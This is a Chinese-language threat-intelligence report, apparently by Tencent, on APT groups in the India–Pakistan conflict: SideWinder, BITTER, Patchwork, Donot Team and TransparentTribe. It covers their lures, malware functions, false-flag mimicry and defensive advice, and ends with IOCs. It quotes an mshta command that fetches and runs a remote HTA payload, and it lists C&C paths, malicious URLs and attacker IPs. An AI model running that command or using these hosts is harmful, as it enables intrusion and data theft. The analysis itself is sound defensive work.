印巴战争阴影下的⽹络战——近期印巴APT组织攻击活动汇总

⼀、背景

印度和巴基斯坦同属于南亚地区的两个国家，但是由于⼀些历史原因，两国关系⼀直不⼤和睦，冲突不断。从2019年初开始，
双⽅关系突然紧张，冲突升级。今年2⽉，印度空军⻜越克什⽶尔巴⽅实控线，被巴军⽅击落并俘获⼀名印度空军⻜⾏员，同时
这也是印度⾸次袭击巴基斯坦境内。两国在克什⽶尔印军队集结并且频繁交⽕，印⽅甚⾄⽔淹巴基斯坦，打开阿尔奇⼤坝，造成

巴基斯坦⾯临洪⽔的危机，同时印⽅⼏⽇前公开宣称，可能会先对巴基斯坦使⽤核武措施。

随着双⽅的军事冲突愈演愈烈时，⽹络战场上也硝烟四起。就在印度空军被俘事件后，腾讯安全御⻅威胁情报中⼼曾捕获并发布

了⼀例以此次冲突事件为诱饵的APT攻击样本，分析后确认了该样本源于巴基斯坦的APT攻击组织TransparentTribe，此外印度针对巴基斯坦的攻击活动也⼀直在持续中，腾讯安全御⻅威胁情报中⼼也曾多次发布相关的分析报告。

⽹络战被认为是地缘政治的延伸，甚⾄是战争和冲突的⼀部分。APT攻击做为⽹络战中的重要攻击活动，其活跃趋势跟地缘政治
等全球热点问题密切相关，全球APT攻击⾼发区域也是全球地缘政治冲突的敏感地域。纵观2019年活跃的⽹络攻击活动，⽆⼀
不是政治局势复杂和敏感的地域，包括朝鲜半岛、委内瑞拉、中东等等。⽹络战已成为国家间政治博弈甚⾄是现代战争的重要组

成部分。

回到印巴冲突中，腾讯安全御⻅情报威胁中⼼捕获到⼤量关于印巴⽹络攻击的恶意样本。经过深度分析和跟踪溯源，我们归类出

较为活跃的⼏个APT组织，包括SideWinder（响尾蛇），BITTER（蔓灵花），⽩象、Donot Team、TransparentTribe等。同时在分析
溯源的过程中，我们还发现APT组织之间相互伪装，试图来混淆安全⼈员分析，躲避追踪。本⽂为对该些活动和组织的⼀些总
结，可能会存在⼀定的疏漏，还请业内同⾏再作补充。

⼆、疑似来⾃印度的攻击

印⽅在对巴基斯坦的⽹络攻击活动中，⼀直处于强势和主导的地步，还涉及到跟印度相关的APT攻击组织也相对较多，较有代表
性的包括SideWinder（响尾蛇），BITTER（蔓灵花），⽩象、Donot等。

1、SideWinder（响尾蛇）

组织概况

SideWinder（响尾蛇）是腾讯安全御⻅情报威胁中⼼最早在2018年披露的APT攻击组织，得名由来为该组织的背景跟卡巴斯基
在2018年第⼀季度报告中提到的SideWinder组织⾮常的相似，虽然卡巴斯基并未发布任何该组织的技术细节和报告。即便如
此，我们还是继续沿⽤卡巴斯基的命名，命名该组织为"响尾蛇"。

该组织的最早的攻击活动可以追溯到 2012 年。在2019年2⽉，腾讯安全御⻅情报威胁中⼼再次详细的披露过该组织在2018年下
半年的⼀些攻击活动。此外，国内有多个安全公司也同时披露过该组织的其他的⼀些攻击活动。

攻击⽬标

主要为巴基斯坦政府部⻔（如内阁部⻔）、巴基斯坦军⽅、军事⽬标等

技术⼿段

SideWinder（响尾蛇）主要采⽤⻥叉攻击的⽅式，投递带有漏洞的office⽂档或者包含恶意 lnk的压缩包⽂件，受害者打开
office⽂档或者恶意lnk⽂件后会下载执⾏hta⽂件，通过执⾏hta脚本进⼀步下载后⻔RAT。

如某次攻击的诱饵：

诱饵名 诱饵hash 上传⽇期 诱饵类型

PassportchangeProfession.zip 050dd090b5af80fb73b2d6e6c8a3adc9 2019-07-15  14:37:20 ZIP

压缩包解压后为⼀个恶意的lnk⽂件：

执⾏命令：

cmd /c start /min mshta http://www.download.gov.pk/cdn-ps.net/images/DCA97-779-fad9c-6bf7d

执⾏的脚本后，除了收集本地杀软信息外，还会解密诱饵pdf⽂件内容并且打开，随着继续下载下⼀阶段的hta脚本。

打开的诱饵pdf内容为：

hta脚本为最终会使⽤⼀个⽩加⿊技术，来执⾏最终的后⻔⽂件SystemApp.dll，该后⻔⽤来进⾏信息的收集，包括系统信息、
⽂件信息等。

⽩加⿊⽂件：

后⻔内容：

此外，其他的攻击中，该组织还会使⽤VB的RAT。

组织⼩节

项⽬类型 内容

组织名称 响尾蛇（SideWinder、T-APT-04）

攻击⽬标 政府部⻔、军⽅、军事⽬标

攻击国家 巴基斯坦

攻击⽬的 窃取敏感资料、信息等

攻击时间 从2012年持续⾄今

曝光时间 最早在2018年5⽉被腾讯御⻅威胁情报中⼼曝光

攻击⽅式 ⻥叉攻击->hta->⽩+⿊（Rat）

诱饵类型 Doc、lnk等

编程语⾔ VB、js、vbs、powershell、C#等

攻击平台 Windows、Android等

攻击者 疑似来⾃印度

2、BITTER（蔓灵花） & Patchwork（⽩象）& White Company & Confucius（孔⼦）

组织概况

之所以把这⼏个组织放在⼀起，是因为我们相信，该四个组织之间都存在⼀定的关联，甚⾄为同⼀组织或同⼀组织分化出来的不

同的⼩组。如BITTER（蔓灵花）跟Patchwork（⽩象）和还有Confucius（孔⼦），我们不⽌⼀次的在我们的分析报告中指出存
在包括武器库、基础设施等的共⽤的证据。

其中，蔓灵花最早在2016由美国安全公司Forcepoint进⾏了披露，并且命名为“BITTER”，得名由来为早期的特⻢的数据包中都
包含字符“BITTER”做为标识,因此得名。同年国内友商360也跟进发布了分析报告，命名为“蔓灵花”。当然该组织除了针对巴基
斯坦进⾏攻击外，也在频繁的针对中国⼤陆的⽬标进⾏攻击活动。

⽩象组织，也叫摩诃草、Patchwork、HangOver，该最早可以追溯到2009年11⽉，⾄今还⾮常活跃。同样该组织除了针对巴基
斯坦进⾏攻击外，也在频繁的针对中国⼤陆的⽬标进⾏攻击活动。

White Company为2018年由cylance公司披露的APT组织，虽然该公司的报告中未明确指出该组织的背景，但是从我们的分析
发现，该组织同样来⾃印度，并且我们也进⼀步发现，该组织的武器库和⽩象相重叠。

Confucius（孔⼦）为Palo Alto Networks Unit 42在2016年发现针对南亚特定⼈群的威胁组织。该组织在恶意代码和基础设施
上与⽩象和蔓灵花均存在重叠，但⽬标稍有不同。

攻击⽬标

组织 攻击⽬标  
BITTER（蔓灵花） 政府部⻔（尤其是外交机构）、军⼯企业、核能企业等

Patchwork（⽩象） 政府机构、科研教育机构和研究所

White  Company 政府、军⽅、军事⽬标

Confucius（孔⼦） 政府、司法部⻔、军⽅

技术⼿段

这⼏个组织都习惯使⽤⻥叉攻击的⽅式，投递含有漏洞或宏的office⽂档、带有漏洞的InPage⽂件、⾃解压⽂件等。

如蔓灵花的诱饵⽂档：

如⽩象的诱饵：

如Confucius（孔⼦）的诱饵：

⽽执⾏诱饵⽂档后，最终的武器库也略有不同。如蔓灵花：

蔓灵花第⼀阶段⽊⻢⼀般都为⼀个downloader，除了下载第⼆阶段的相关⽊⻢外，还会收集⽤户的相关信息，如上报信息：
. {a×adminstr‣b8c6) b×ADMINIST‣
B8C6) c×Microsoft 86Windows 86XP) d×AdministratorAdministrator9fbc7‣b8a‣‣a‣
fbe887b9‣9666) e×.

上报内容包括主机名、计算机名、操作系统名、⽤户名等。

⽽第⼆阶段为下发相应的插件，插件内容包括添加开机启动、键盘记录、最终的远控⽊⻢等。

此外，蔓灵花还存在⼀些使⽤习惯，如⽂件⽬录习惯使⽤new_downloader_xxx：

⽽下载地址习惯使⽤healthne：
序号 插件下载地址 插件功能

1 http://C&C地址/healthne/healthne/regdl 添加开机启动

2 http://C&C地址/healthne/healthne/igfxsrvk 键盘记录

3 http://C&C地址/healthne/healthne/spoolvs 最终的远控⽊⻢

如⽩象：

今年最常使⽤的特⻢为名为badnews的特⻢，使⽤github和feed43等公⽤平台⽤来分发C&C：

特⻢功能

命令号 功能

0 退出⽊⻢进程，结束控制

8 获取键盘记录：上传TPX498.dat，即键盘记录⽂件

23 获取截屏：截屏并存储为TPX499.dat，并上传

13 上传⽂件：读取指定⽂件内容写⼊到AdbFle.tmp，并上传

4 获取⽂档⽂件⽬录列表：上传edg499.dat并删除，再运⾏⼀次⽊⻢⾃身

5 上传指定路劲的⽂件

33 下载⽂件：从指定URL下载⽂件，并执⾏

组织关系

我们之前的⽂章已经多次指出了BITTER、⽩象、Confucius之间的关系，本⽂着重描述下⽩象跟White Company之间的关系。

如我们从确定⽩象的某个样本中（97187e5e8b9a752b5f6377df3bea17b5），发现了样本中包含了提权漏洞CVE-2016-7255
的模块：

把该模块dump下来后，根据模块的特征我们进⾏搜索，发现了某篇⽂章中：

跟⽂章中的代码完全相似：

⽽我们队该漏洞的所有公开利⽤的代码经过搜寻，以及对该模块的特征进⾏搜索，均未在其他的攻击活动中发现跟该模块匹配的

利⽤代码和代码结构，因此我们判断该特权利⽤模块为该组织特有，⽽该⽂章曝光的活动的组织跟⽩象为同⼀个或者能通⽤武器

库的攻击⼩组。

⽽继续对该⽂章中披露的组织进⾏研究，我们发现该攻击组织就位cylance曝光的White Company：

组织⼩节

3、Donot Team

组织概况

Donot Team是2018年被曝光的APT攻击组织，最早在2018年3⽉由NetScout公司的ASERT团队进⾏了披露，随后国内的⼚商
奇安信也进⾏了披露。

该组织的得来⾃某攻击⽂件中的 pdb中含有 donot⽬录，因此取名 Donot Team，国内的安全⼚商奇安信通过⾳译命名为肚脑⾍，我们继续沿⽤该命名。该组织主要针对巴基斯坦进⾏攻击活动。

攻击⽬标

巴基斯坦政府部⻔、巴基斯坦军⽅、⾦融机构、外贸⼈⼠等

技术⼿段

Donot Team通常会投递带有恶意宏的office⽂档⽂件，⽂档名和⽂档内容都具有很强的针对性。

如使⽤巴基斯坦空军的诱饵：

如伪装巴基斯坦国家银⾏Excel计算器：

当受害者打开office恶意样本后，会提示执⾏宏代码，点击执⾏后会释放包含脚本和后⻔程序的压缩包，然后解压执⾏脚本，脚
本最终会启动后⻔⽊⻢。

相关宏代码：

释放的压缩包：

执⾏脚本代码：

最终执⾏的恶意⽂件，会根据返回的Content-Typel来进⾏下⼀步⾏为：
1）当返回的为application时则会将返回的包解码exe后存储到  %userprofile%\\DriveData\\Files\\⽬录下。
2）当返回的是cmdline时，则会执⾏%userprofile%\\DriveData\\Files\\wuaupdt.exe
3）当返回的是batcmd的时，则会执⾏%userprofile%\\DriveData\\Files\\test.bat
4）除了windows上的攻击外，Donot Team还拥有移动端的攻击能⼒。如使⽤安卓特⻢StealJob的攻击流程：

相关功能

控制指令 指令含义

live_recording_scheduling_job 进⾏录⾳控制

tag_network_info_job 获取⽹络状态并上传

tag_directory_trees_job 获取⼿机⽂件⽬录并上传

tag_live_recordings_job 录⾳并上传录⾳⽂件

tag_key_logs_job 获取密钥⽇志并上传

tag_user_profile_job 获取通讯录并上传

tag_location_job 获取地理位置并上传

tag_apps_info_job 获取⼿机已安装应⽤并上传

test_job 测试

tag_sms_job 获取⽤户⼿机短信并上传

tag_calls_logs_job 获取⽤户⼿机通讯录并上传

tag_control_info_retrieval_job 检索控制信息

tag_notifications_job 获取通知并上传

tag_location_sender_job 获取位置并上传

tag_files_sending_job 上传⽂件

polling_job 对程序本身功能进⾏监控，并做出相应的操作

tag_contacts_job 获取⼿机IMEI并上传

tag_call_recordings_job 获取通话录⾳并上传

tag_device_info_job 获取⼿机固件信息并上传

tag_key_exchange_job 密钥交换

组织⼩节

项⽬类型 内容

组织名称 肚脑⾍（Donot  Team）

攻击⽬标 巴基斯坦政府部⻔、巴基斯坦军⽅、⾦融机构、外贸⼈⼠等

攻击国家 巴基斯坦

攻击⽬的 窃取敏感资料、信息等

攻击时间 从2017年持续⾄今

曝光时间 最早在2018年3⽉由NetScout公司的ASERT团队进⾏了披露

攻击⽅式 ⻥叉攻击->Zip->RAT

诱饵类型 Office、Apk等

编程语⾔ VB、C++、java等

攻击平台 Windows、Android等

攻击者 疑似来⾃印度

三、疑似来⾃巴基斯坦的攻击

巴⽅在对印度的⽹络攻击活动中，⼀直处于弱势和挨打的地位，⽬前发现的相关的APT攻击组织也相对较少，较有代表性的是
TransparentTribe。

组织概况

TransparentTribe APT组织，⼜称ProjectM、C-Major，该组织的活动最早可以追溯到2012年。该组织的相关活动在2016年3
⽉被proofpoint披露，趋势科技随后也跟进进⾏了相关活动的披露。

腾讯安全御⻅威胁情报中⼼曾在上半年曝光过该组织的相关攻击活动。

攻击⽬标

印度政府、印度军⽅、军事研究机构等。

技术⼿段

TransparentTribe通常投递带有恶意宏的office⽂档,诱饵⽂档内容多与政府、军事相关，当受害者打开恶意⽂档后，会提示执⾏
宏代码，⼀般点击执⾏后诱饵内容才会显示出来。

如跟印度陆战研究中⼼（CLAWS）相关诱饵：

如跟印度国防学院(NDC)相关诱饵：

宏代码执⾏后会释放⼀个压缩包⽂件，并解压出包含的⽊⻢后⻔执⾏：

在后⻔使⽤上，该组织依旧使⽤CrimsonRAT、.net loader、.net droper、PeppyRAT 相关特⻢：

⽽经过腾讯安全御⻅威胁情报中⼼的数据溯源，该组织疑似跟巴基斯坦另外⼀个组织Gorgon Group有⼀定的关联：

组织⼩节

项⽬类型 内容

组织名称 TransparentTribe、ProjectM、C-Major

攻击⽬标 政府、军⽅、军事研究机构等

攻击国家 印度

攻击⽬的 窃取敏感资料、信息等

攻击时间 从2012年持续⾄今

曝光时间 最早在2016年3⽉被proofpoint披露

攻击⽅式 ⻥叉攻击->Zip->RAT

诱饵类型 Office等

编程语⾔ VBS、C#、Python等

攻击平台 Windows等

攻击者 疑似来⾃巴基斯坦

四、存在的假旗（false flag）
在印巴双⽅⽹络战持续不断时，其中Donot Team和TransparentTribe 两个APT组织引起我们格外的注意，经过详细分析后发现
两个疑似敌对组织不断的互相模仿，影响安全研究⼈员对其追踪溯源。

例如Donot样本宏代码和TransparentTribe样本宏代码⾼度相似，可以看到Donot宏代码注释的地⽅，注释的这段代码是要执⾏
的exe路径，但是Donot实际上执⾏的是bat脚本，我们再对⽐下TransparentTribe就能发现，TransparentTribe才是执⾏exe
的。并且Donot样本中这段被注释的代码与TransparentTribe样本中的⼀致。

并且部分代码函数都是⼀模⼀样的，函数命名和常量值。

甚⾄在某些样本中两个APT组织释放的⽊⻢名称都完全⼀样。

我们相信，印巴双⽅的组织还会继续模仿下去，这势必给安全研究⼈员在定性上产⽣更多的⼲扰。

五、总结

从上⽂可以看到，由于印巴两国的⻓期以来的紧张关系，⽹络攻击⼀直都没停⽌过。即便两国的活动多次被安全公司所曝光，但

是各⾃国家的组织完全没停⽌攻击的意思，相反是越来越猛烈。2019年对印巴两国来说，是个不平静的⼀年，双边的局势冲突
不断，⽹络战也⼀浪⾼过⼀浪。我们相信，这种⽹络抗衡会持续进⾏下去。

没有⽹络安全就没有国家安全，随着政治局势的恶化，⽹络战势必会愈演愈烈。虽然我们处于和平年代，但是我们的相关部⻔和

单位切记要提⾼警惕，保障重点部⻔和单位的⽹络安全。

六、安全建议

针对重要政府机构、重点企业、科研单位的APT攻击，已经成为⽹络战背景下的⽇常偷袭活动，攻击者平时以刺探情报、⼊侵渗
透为主，⼀旦冲突加剧，随时可能提升攻击破坏的烈度。腾讯安全专家建议相关敏感单位加强⽹络信息系统安全管理，加强对员

⼯的安全意识教育，防患于未然。可参考以下⼏点建议：

1、建议不要打开不明来源的邮件附件；除⾮⾮常清楚⽂档来源可靠，否则建议不要启⽤Office执⾏宏代码；

2、及时安装系统补丁和重要软件的补丁；

3、使⽤杀毒软件防御可能的病毒⽊⻢攻击，建议全⽹安装御点终端安全管理系统。御点终端安全管理系统具备终端杀毒统⼀管控、修复漏洞统⼀管控，以及
策略管控等全⽅位的安全管理功能，可帮助企业管理者全⾯了解、管理企业内⽹安全状况、保护企业安全。

4、使⽤腾讯御界⾼级威胁检测系统，及时发现APT攻击的蛛丝⻢迹。腾讯御界⾼级威胁检测系统，是基于腾讯安全反病毒实验
室的安全能⼒、依托腾讯在云和端的海量数据，研发出的独特威胁情报和恶意检测模型系统。

IOCs
MD5：
050dd090b5af80fb73b2d6e6c8a3adc9
d78d30c43bdd0251fce773376a2eca24
4d59b084df25e9c6cba6343b753077b3
86938e9ed38f59630ee2318ad5a91f30
7b6fb1c1cf09cb371f8a22ac3c19da10
f64125c34cb209c71ca137513bf9714b
35a9d47a8b6d0fab0a8bfdf1b1381486
9eb7cbd46aa2aa624ae13acb64394b1c
6d3e9283b52086a406358ca914e23837
afffa7af5e795f911434b6e7016fc6e5
3c06cbcb6bb57b688ca30659c6c031a5
e9c8d0d4c74d53566b446e1242947e15
23b4dbbe5f3a44798312c1fd66117221
42b713a261d61c5c00b7704ae1f4b912
561adc55d8a9bf9d6966f7dd234d1e20
a66aa5eb35c67f685cc425c1d04d0f5f
cf665bbf0c208e5eb29ad99f9154bf3e
a6270064f1630cdf5bcda858762db516
7f99acb32db8b99fbe9347d3e69e9063
0a3a423d5cd7628efcc12cdbce378edf
0108a194e11a2d871f5571108087c05d
f7d2b9541d9035d31c637d39d88d18a7
08a8db28207fa13ebb25cf0064d12f17
9c6999f6b2415761fa85d6391dfb4628
f5a5f7af4e46e89e9f2a84cc293f1250
0fa9b24535f55ec64be0f02a75d637b3
43a2dad49d410b143b8a26772d6e71dd
159890b8b9e66cc8138d332d860ddd96
4d401db3dc6172e7b16bcbe7d87fc526
02ba9703d1f250b411ea4c868d17fd2e
db5193d53f7bb509928304ad8326f359
8d8822326f53982b141dc0e7f6cf948a
91e5c5afcf42f8912d5ae3b7dafcda22
96e351e7faf7197677e58a1f6390b0f0
babca0f4ccca5c46f6145580a92284f9
427d28ebedbe8b2b730de1d34435dcb8

URL：
https://trans-pre.net/ini/sJDts1oInx8fbn0ffcxa3R6L82v5k8Ali9eiPb78/11991/5183/be30afa8
http://www.download.fbr.gov.pk.cdn-ps.net/plugins/11991/5183/true/true/
http://www.download.fbr.gov.pk.cdn-ps.net/cgi/8ee4d36866/11991/5183/aca094d0/file.hta
http://www.download.fbr.gov.pk.cdn-ps.net/images/5DC7A431/11991/5183/fad436c7/60b9f1d
http://www.cdn-ps.net/plugins/-1/9373/true/true/
http://www.cdn-ps.net/cgi/8ee4d36866/-1/9373/34f1d81f/file.hta
https://trans-pre.net/ini/NrveX8Yi7Mgr06nqM86Wba9uW8LdbbJ2HAaB9zWG/-1/9373/8a7b946c

C&C：
185.99.133.27
data-backup.online
unique.fontsupdate.com
servicejobs.life
212.32.226.244
111.115.60.18
ezeescan.com
95.168.176.141